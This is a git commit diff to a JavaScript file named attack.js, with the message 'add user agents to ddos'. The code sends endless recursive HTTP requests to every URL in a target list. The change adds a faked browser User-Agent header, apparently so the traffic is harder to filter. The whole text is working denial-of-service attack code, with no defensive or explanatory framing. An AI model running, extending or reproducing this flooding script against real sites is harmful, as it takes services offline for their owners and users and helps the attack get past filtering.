6b22a5589043aa127445d29ab9056b67d5262a2f
Patrick Lin <apocalypsecalculator@gmail.com>
2022-02-26 21:02:50 -0500

    add user agents to ddos

--- attack.js
+++ attack.js
@@ -1,12 +1,19 @@
 const axios = require('axios').default;
+const useragent = require('user-agents');
 const list = require('./list');
+
+const userAgent = new useragent().toString();
 
 for(let i = 0; i < list.length; i++) {
     sendReq(list[i]);
 }
 
 async function sendReq(link) {
-    axios.get(link).then(() => {
+    axios.get(link, {
+        headers: {
+            'User-Agent': userAgent
+        }
+    }).then(() => {
         console.log(link);
         sendReq(link);
     }).catch(err => {});
